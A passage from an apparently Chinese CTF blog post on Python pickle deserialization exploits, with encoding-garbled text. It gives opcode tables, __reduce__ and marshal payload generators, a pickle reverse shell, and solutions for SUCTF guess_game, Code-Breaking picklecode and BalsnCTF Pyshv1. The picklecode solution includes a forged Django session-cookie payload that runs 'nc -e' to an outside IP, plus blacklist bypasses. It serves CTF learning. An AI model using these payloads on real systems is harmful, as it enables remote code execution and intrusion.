æµç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹</h4><ul><li><p>ç”Ÿæˆå…ƒç»„çš„æŒ‡ä»¤</p><pre><code>(S&#39;str1&#39;S&#39;str2&#39;I1234t</code></pre></li><li><p>ç”Ÿæˆå…ƒç»„çš„è¿‡ç¨‹å›¾</p></li></ul><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p><h4 id="åŠ è½½å¯¹è±¡"><a href="#åŠ è½½å¯¹è±¡" class="headerlink" title="åŠ è½½å¯¹è±¡"></a>åŠ è½½å¯¹è±¡</h4><table><thead><tr><th>æ“ä½œç </th><th>åŠ©è®°</th><th>æè¿°</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td>c</td><td>GLOBAL</td><td>éœ€è¦ä¸¤ä¸ªå‚æ•°(module,class)æ¥åˆ›å»ºå¯¹è±¡,å¹¶å°†å…¶æ”¾åˆ°æ ˆä¸­</td><td>cos\nsystem\n</td></tr><tr><td>R</td><td>REDUCE</td><td>å¼¹å‡ºä¸€ä¸ªå‚æ•°å…ƒç»„å’Œä¸€ä¸ªå¯è°ƒç”¨å¯¹è±¡ï¼ˆå¯èƒ½æ˜¯ç”±GLOBALåŠ è½½çš„ï¼‰ï¼Œå°†å‚æ•°åº”ç”¨äºå¯è°ƒç”¨å¯¹è±¡å¹¶å°†ç»“æœå‹å…¥æ ˆä¸­</td><td>cos\nsystem\n(Sâ€™sleep 10â€™\ntR</td></tr></tbody></table><h4 id="åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾"><a href="#åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾" class="headerlink" title="åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾"></a>åŠ è½½å¯¹è±¡è¿‡ç¨‹å›¾</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p><h2 id="ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§"><a href="#ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§" class="headerlink" title="ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§"></a>ç¼–å†™pickleçš„ä¸€äº›æŠ€å·§</h2><p>æˆ‘ä»¬å¦‚ä½•æ‰§è¡Œå¦‚ä¸‹çš„ä»£ç :</p><pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) f.read()</code></pre><p>æ€è·¯æ˜¯:é¦–å…ˆæ‰§è¡Œopenå‡½æ•°,å°†å…¶å‚¨å­˜åœ¨memoé‡Œé¢,åœ¨åˆ©ç”¨é­”æœ¯æ–¹æ³•æ¥æ‰§è¡Œf.read()</p><p><code>f.read()</code>å¯ä»¥ç­‰ä»·æ›¿æ¢æˆ<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p><p>æœ€ååˆæˆçš„pickleæ˜¯</p><pre><code>#step1c__builtin__open(S&#39;/path/to/massive/sikrit&#39;tRp100#step2c__builtin__apply(c__builtin__getattr(c__builtin__fileS&#39;read&#39;tR(g100ltR.</code></pre><h3 id="æ‰‹å†™pickleæ¨¡æ¿"><a href="#æ‰‹å†™pickleæ¨¡æ¿" class="headerlink" title="æ‰‹å†™pickleæ¨¡æ¿"></a>æ‰‹å†™pickleæ¨¡æ¿</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p><h3 id="åˆ©ç”¨-reduce-æ¥ç”Ÿæˆpickleä»£ç "><a href="#åˆ©ç”¨-reduce-æ¥ç”Ÿæˆpickleä»£ç " class="headerlink" title="åˆ©ç”¨__reduce__æ¥ç”Ÿæˆpickleä»£ç "></a>åˆ©ç”¨<code>__reduce__</code>æ¥ç”Ÿæˆpickleä»£ç </h3><p><code>__reduce__</code></p><blockquote><p>å½“å®šä¹‰æ‰©å±•ç±»å‹æ—¶ï¼ˆä¹Ÿå°±æ˜¯ä½¿ç”¨Pythonçš„Cè¯­è¨€APIå®ç°çš„ç±»å‹ï¼‰ï¼Œå¦‚æœä½ æƒ³pickleå®ƒä»¬ï¼Œä½ å¿…é¡»å‘Šè¯‰Pythonå¦‚ä½•pickleå®ƒä»¬ã€‚ <strong>reduce</strong> è¢«å®šä¹‰ä¹‹åï¼Œå½“å¯¹è±¡è¢«Pickleæ—¶å°±ä¼šè¢«è°ƒç”¨ã€‚ </p></blockquote><pre><code class="python">import os, pickleclass Test(object):    def __reduce__(self):        return (os.system,(&#39;ls&#39;,))print(pickle.dumps(Test(), protocol=0))</code></pre><h3 id="åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç "><a href="#åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç " class="headerlink" title="åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç "></a>åˆ©ç”¨marshalå’ŒcPickleæ¥ç”Ÿæˆä»£ç </h3><pre><code class="python"># !/usr/bin/env python# -*- coding:utf-8 -*-__author__ = &#39;bit4&#39;__github__ = &#39;https://github.com/bit4woo&#39;import marshalimport base64import cPickleimport urllibimport pickledef foo():#you should write your code in this function    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;dir&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))#ä¸ºäº†ä¿è¯code_serializedä¸­çš„å†…å®¹å¾—åˆ°æ‰§è¡Œï¼Œæˆ‘ä»¬éœ€è¦å¦‚ä¸‹ä»£ç #(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()payload =  &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))print(payload)</code></pre><h2 id="ç»éªŒ"><a href="#ç»éªŒ" class="headerlink" title="ç»éªŒ"></a>ç»éªŒ</h2><h3 id="é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•"><a href="#é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•" class="headerlink" title="é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•"></a>é€šè¿‡æºç æŸ¥çœ‹pickleçš„æ–¹æ³•</h3><p>ç›´æ¥æ‰€æœ‰æ“ä½œç å¯¹åº”çš„å˜é‡</p><p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p><p><code>dispatch[BININT1[0]] = load_binint1</code></p><p>æ‰¾åˆ°ç±»ä¼¼è¿™ç§çš„åé¢çš„å°±æ˜¯å¯¹åº”çš„å‡½æ•°</p><h2 id="pickleå·¥å…·"><a href="#pickleå·¥å…·" class="headerlink" title="pickleå·¥å…·"></a>pickleå·¥å…·</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p><h3 id="åå¼¹shell"><a href="#åå¼¹shell" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre><p>localhost:55555</p><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><ol><li>ä½¿ç”¨v0ç‰ˆçš„pickleåè®®,ä¿è¯shellcodeçš„é€šç”¨æ€§</li></ol><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><p>è€ƒç‚¹:pickle</p><p>ä»£ç å®¡è®¡ä¸€æ³¢å</p><p>å¦‚æœçŒœå¯¹10æ¬¡åä¼šç»™flag(æœºä¼šåªæœ‰10æ¬¡)</p><p>å› ä¸ºçŸ¥é“æ˜¯è€ƒpickleç›´æ¥å…¨å±€æœç´¢pickleå‘ç°åœ¨serverå¤„æœ‰</p><p><code>ticket = restricted_loads(ticket)</code></p><p>å…¶ä¸­ticketæ˜¯æˆ‘ä»¬å¯æ§ç‚¹</p><p>è·Ÿè¿›å»çœ‹</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:            return getattr(sys.modules[module], name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>æˆ‘ä»¬åªèƒ½åŠ è½½guess_gameä¸­çš„ç±»,å¹¶ä¸”ä¸èƒ½è°ƒç”¨é­”æœ¯æ–¹æ³•.</p><p>åœ¨è¿™ä¸€é¢˜ä¸­æ‹¿åˆ°flagæœ‰ä¸¤ç§æ–¹å¼:</p><ol><li>å‘½ä»¤æ‰§è¡Œ</li><li>é€šè¿‡æ¸¸æˆ</li></ol><p>åœ¨æ€¼ç€find_classè®¸ä¹…ä¹‹åå‘ç°æ²¡åŠæ³•ç»•è¿‡,äºæ˜¯åªèƒ½èµ°é€šè¿‡æ¸¸æˆè¿™ä¸€æ¡è·¯äº†</p><p>è€Œæ¸¸æˆä¸­åˆ¤å®šèµ¢çš„æ¡ä»¶æ˜¯</p><pre><code class="python">class Game    def is_win(self):        return self.win_count == max_round</code></pre><p>å¦‚æœæˆ‘ä»¬èƒ½ç›´æ¥ä¿®æ”¹win_countæˆ–è€…max_roundå°±å¯ä»¥æ‹¿åˆ°flagäº†</p><p>æˆ‘ä»¬å‘ç°åœ¨<code>guess_game</code>ä¸­å·²ç»æœ‰ä¸€ä¸ª<code>game = Game()</code>è¿™ä¸ªäº†,ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pickleæ¥åŠ è½½è¿™ä¸ªgameç›´æ¥ä¿®æ”¹</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•ä¿®æ”¹äº†</p><p>åœ¨pickleçš„æ“ä½œç ä¸­æˆ‘ä»¬å‘ç°</p><p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>è¿™ä¸€æ¡</p><p>å…¶ä¸­update()å°±å¯ä»¥ä¿®æ”¹gameçš„å±æ€§äº†</p><p>é‚£ä¹ˆæ¥ä¸‹æ¥å°±åªæœ‰ä¸€ä¸ªé—®é¢˜äº†,æ“ä½œç <code>b</code>å¦‚ä½•ä½¿ç”¨</p><p>ä¸€è·¯è·Ÿè¸ªå‘ç°bæ“ä½œç çš„å®ç°</p><pre><code class="python">    def load_build(self):        stack = self.stack        state = stack.pop()        inst = stack[-1]        setstate = getattr(inst, &quot;__setstate__&quot;, None)        if setstate is not None:            setstate(state)            return        slotstate = None        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if state:            inst_dict = inst.__dict__            intern = sys.intern            for k, v in state.items():                if type(k) is str:                    inst_dict[intern(k)] = v                else:                    inst_dict[k] = v        if slotstate:            for k, v in slotstate.items():                setattr(inst, k, v)</code></pre><p>æ²¡æœ‰è°ƒç”¨å‚æ•°,æ ˆé¡¶åº”ä¸ºå­—å…¸,æ ˆé¡¶çš„ä¸‹é¢æ˜¯è¦ä¿®æ”¹çš„å¯¹è±¡</p><p>æœ€åçš„payload:</p><pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre><h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">é¢˜ç›®é“¾æ¥</a></p><p>ä»£ç å®¡è®¡å‘ç°åœ¨indexå¤„å¯ä»¥ssti</p><pre><code class="python">def index(request):    django_engine = engines[&#39;django&#39;]    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)    return HttpResponse(template.render(None, request))</code></pre><p>ä½†æ˜¯djangoéš¾ä»¥åˆ©ç”¨sstiå‘½ä»¤æ‰§è¡Œä½†æ˜¯èƒ½è¯»å–æ•æ„Ÿé…ç½®</p><p>ç»“åˆserializer.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in self.blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))class PickleSerializer():    def dumps(self, obj):        return pickle.dumps(obj)    def loads(self, data):        try:            if isinstance(data, str):                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)            file = io.BytesIO(data)            return RestrictedUnpickler(file,                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()        except Exception as e:            return {}</code></pre><p>å’Œsettingæ–‡ä»¶é‡Œçš„ç‰¹æ®Šé…ç½®</p><pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre><p>æŸ¥é˜…djangoæ–‡æ¡£å‘ç°</p><p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p><p>å¯ä»¥ç¡®å®š,è¿™é‡Œæ˜¯é€šè¿‡è¯»å–secret_keyæ¥æ„é€ æ¶æ„cookieæ¥pickleååºåˆ—åŒ–å‘½ä»¤æ‰§è¡Œ</p><p>æˆ‘ä»¬è·Ÿè¿›django.contrib.sessions.backends.signed_cookiesæ¥äº†è§£å¦‚ä½•ç”Ÿæˆå‚¨å­˜sessionçš„cookie(è¿™é‡ŒèŠ±äº†æˆ‘å¾ˆä¹…çš„æ—¶é—´,ä»å°è¯•çœ‹ä¸€æ­¥ä¸€æ­¥è°ƒè¯•åˆ°çœ‹è°ƒç”¨å †æ ˆå†åˆ°æŸ¥æ–‡æ¡£æœ€åæ‰ææ¸…æ¥šè¿‡ç¨‹,å»ºè®®è‡ªå·±å°è¯•)</p><p>åœ¨ç†è§£ä¹‹åä¾¿æœ‰ä¸€ä¸‹ç”Ÿæˆæ¶æ„cookieçš„ä»£ç </p><pre><code class="python">import base64import datetimeimport jsonimport reimport timeimport zlibimport picklefrom django.utils import baseconvfrom django.utils.crypto import constant_time_compare, salted_hmacfrom django.utils.encoding import force_bytesfrom django.utils.module_loading import import_stringfrom django import corefrom django.core import signingmyexp=b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;def pickle_exp(SECRET_KEY):    data = myexp    compress=True    # Flag for if it&#39;s been compressed or not    is_compressed = False    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;    if compress:        # Avoid zlib dependency unless compress is being used        compressed = zlib.compress(data)        if len(compressed) &lt; (len(data) - 1):            data = compressed            is_compressed = True    base64d = signing.b64_encode(data).decode()    if is_compressed:        base64d = &#39;.&#39; + base64d    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))pickle_exp(&quot;asdasdasdasdas&quot;)</code></pre><p>æ¥ä¸‹æ¥å°±æ˜¯å¦‚ä½•æ„é€ æ¶æ„çš„pickleä»£ç çš„é—®é¢˜äº†</p><p>é¢˜ç›®é™åˆ¶äº†åªèƒ½åŠ è½½builtinsé‡Œçš„å±æ€§</p><p>ä¸”å±æ€§åä¸èƒ½ä¸ºä»¥ä¸‹å†…å®¹</p><pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>åˆ©ç”¨<code>__reduce__</code>æ¥ç”Ÿæˆpickleä»£ç å·²ç»æ— æ³•æ»¡è¶³è¦æ±‚äº†,æˆ‘ä»¬ä¸å¾—ä¸æ‰‹å†™pickleä»£ç ,æ€ä¹ˆæ‰‹å†™å°±ä¸è¯¦ç»†è®²äº†</p><p>æˆ‘ä»¬ç°åœ¨æŠŠç›®å…‰èšç„¦åœ¨å¦‚ä½•æ„é€ åˆ©ç”¨é“¾ä¸Š</p><p>builtinsçš„å±æ€§(åˆ é™¤éƒ¨åˆ†)</p><pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre><p>æˆ‘ä»¬æŸ¥çœ‹builtinsçš„å±æ€§æˆ‘ä»¬å‘ç°ä¸¤ä¸ªæœ‰æ„æ€çš„ä¸œè¥¿,ä¸€ä¸ªæ˜¯getattr,å¦ä¸€ä¸ªæ˜¯globals</p><p>è™½ç„¶é™åˆ¶æˆ‘ä»¬å±æ€§åä¸èƒ½ä¸ºevalå•¥çš„,ä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ä¸èƒ½å‡ºç°åœ¨å‚æ•°å¤„</p><p>æ‰€ä»¥<code>getattr(builtins,&quot;eval&quot;)</code>ä¾¿èƒ½å¾—åˆ°evalæ–¹æ³•äº†</p><p>ä½†æ˜¯çœ‹pickleçš„æ“ä½œç å¹¶æ²¡æœ‰å‘ç°èƒ½ç›´æ¥å¯¼å…¥ä¸€ä¸ªæ¨¡å—çš„æ“ä½œ,åœ¨ç»“åˆglobalsæˆ‘ä»¬å¾ˆå®¹æ˜“æƒ³åˆ°<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p><p>æœ€åçš„payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p><p>å…¶å¯¹åº”çš„pickleä»£ç æ˜¯</p><pre><code class="python">b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;</code></pre><p>æœ€åå°±å·®secret_keyäº†,çœ‹åˆ«äººçš„wpéƒ½æ˜¯è°ƒè¯•æ˜“å¾—æ˜“å¾—secret_key//</p><p>ä½†æ˜¯æˆ‘æ˜¯æ²¡æ‰¾åˆ°,äºæ˜¯è‡ªå·±å†™äº†ä¸ªè¿‡æ»¤å™¨</p><p>é€’å½’æŸ¥æ‰¾settings</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or &quot;settings&quot; in objdir:        print(way)        return result+way+&quot;\n&quot;    return result</code></pre><p>è¿™æ¬¡æ˜¯çœŸçš„æ˜“å¾—äº†:),è‡³æ­¤ç»“æŸ</p><h3 id="BalsnCTF-2019-Pyshv1"><a href="#BalsnCTF-2019-Pyshv1" class="headerlink" title="BalsnCTF 2019 Pyshv1"></a>BalsnCTF 2019 Pyshv1</h3><pre><code class="python">#!/usr/bin/python3 -uimport securePickle as pickleimport codecspickle.whitelist.append(&#39;sys&#39;)class Pysh(object):    def __init__(self):        self.login()        self.cmds = {}    def login(self):        user = input().encode(&#39;ascii&#39;)        user = codecs.decode(user, &#39;base64&#39;)        user = pickle.loads(user)        raise NotImplementedError(&quot;Not Implemented QAQ&quot;)    def run(self):        while True:            req = input(&#39;$ &#39;)            func = self.cmds.get(req, None)            if func is None:                print(&#39;pysh: &#39; + req + &#39;: command not found&#39;)            else:                func()if __name__ == &#39;__main__&#39;:    pysh = Pysh()    pysh.run()</code></pre><pre><code class="python">import pickleimport iowhitelist = []# See https://docs.python.org/3.7/library/pickle.html#restricting-globalsclass RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        if module not in whitelist or &#39;.&#39; in name:            raise KeyError(&#39;The pickle is spoilt :(&#39;)        return pickle.Unpickler.find_class(self, module, name)def loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps</code></pre><p>åªå…è®¸sysé‡Œçš„å±æ€§,è€Œä¸”å±æ€§é‡Œä¸èƒ½æœ‰.</p><pre><code>[&#39;__displayhook__&#39;, &#39;__doc__&#39;, &#39;__excepthook__&#39;, &#39;__interactivehook__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;__stderr__&#39;, &#39;__stdin__&#39;, &#39;__stdout__&#39;, &#39;_clear_type_cache&#39;, &#39;_current_frames&#39;, &#39;_debugmallocstats&#39;, &#39;_getframe&#39;, &#39;_git&#39;, &#39;_home&#39;, &#39;_xoptions&#39;, &#39;abiflags&#39;, &#39;api_version&#39;, &#39;argv&#39;, &#39;base_exec_prefix&#39;, &#39;base_prefix&#39;, &#39;builtin_module_names&#39;, &#39;byteorder&#39;, &#39;call_tracing&#39;, &#39;callstats&#39;, &#39;copyright&#39;, &#39;displayhook&#39;, &#39;dont_write_bytecode&#39;, &#39;exc_info&#39;, &#39;excepthook&#39;, &#39;exec_prefix&#39;, &#39;executable&#39;, &#39;exit&#39;, &#39;flags&#39;, &#39;float_info&#39;, &#39;float_repr_style&#39;, &#39;get_asyncgen_hooks&#39;, &#39;get_coroutine_wrapper&#39;, &#39;getallocatedblocks&#39;, &#39;getcheckinterval&#39;, &#39;getdefaultencoding&#39;, &#39;getdlopenflags&#39;, &#39;getfilesystemencodeerrors&#39;, &#39;getfilesystemencoding&#39;, &#39;getprofile&#39;, &#39;getrecursionlimit&#39;, &#39;getrefcount&#39;, &#39;getsizeof&#39;, &#39;getswitchinterval&#39;, &#39;gettrace&#39;, &#39;hash_info&#39;, &#39;hexversion&#39;, &#39;implementation&#39;, &#39;int_info&#39;, &#39;intern&#39;, &#39;is_finalizing&#39;, &#39;last_traceback&#39;, &#39;last_type&#39;, &#39;last_value&#39;, &#39;maxsize&#39;, &#39;maxunicode&#39;, &#39;meta_path&#39;, &#39;modules&#39;, &#39;path&#39;, &#39;path_hooks&#39;, &#39;path_importer_cache&#39;, &#39;platform&#39;, &#39;prefix&#39;, &#39;ps1&#39;, &#39;ps2&#39;, &#39;set_asyncgen_hooks&#39;, &#39;set_coroutine_wrapper&#39;, &#39;setcheckinterval&#39;, &#39;setdlopenflags&#39;, &#39;setprofile&#39;, &#39;setrecursionlimit&#39;, &#39;setswitchinterval&#39;, &#39;settrace&#39;, &#39;stderr&#39;, &#39;stdin&#39;, &#39;stdout&#39;, &#39;thread_info&#39;, &#39;version&#39;, &#39;version_info&#39;, &#39;warnoptions&#39;]</code></pre><p>å‘ç°æœ‰ä¸ªmodules,ä½†æ˜¯loadsé‚£é‡Œæœ‰ä¸€ä¸ªæ­»äº¡raise</p><p><code>sys._getframe</code> å¯ä»¥è¿”å›å¸¦æœ‰execçš„å­—å…¸,ä½†æ˜¯å¥½åƒæ²¡å•¥ç”¨</p><p>ç°åœ¨é—®é¢˜æ˜¯ä¸çŸ¥é“å¦‚ä½•å–å‡ºmodulesé‡Œçš„å€¼</p><p>é˜…è¯»æ–‡æ¡£å‘ç°</p><blockquote><p>This is a dictionary that maps module names to modules which have already been loaded. This can be manipulated to force reloading of modules and other tricks. However, replacing the dictionary will not necessarily work as expected and deleting essential items from the dictionary may cause Python to fail. </p></blockquote><p>å¯ä»¥ä¿®æ”¹modulesæ¥ä¿®æ”¹æ¨¡å—å†…å®¹</p><pre><code class="shell">&gt;&gt;&gt; import 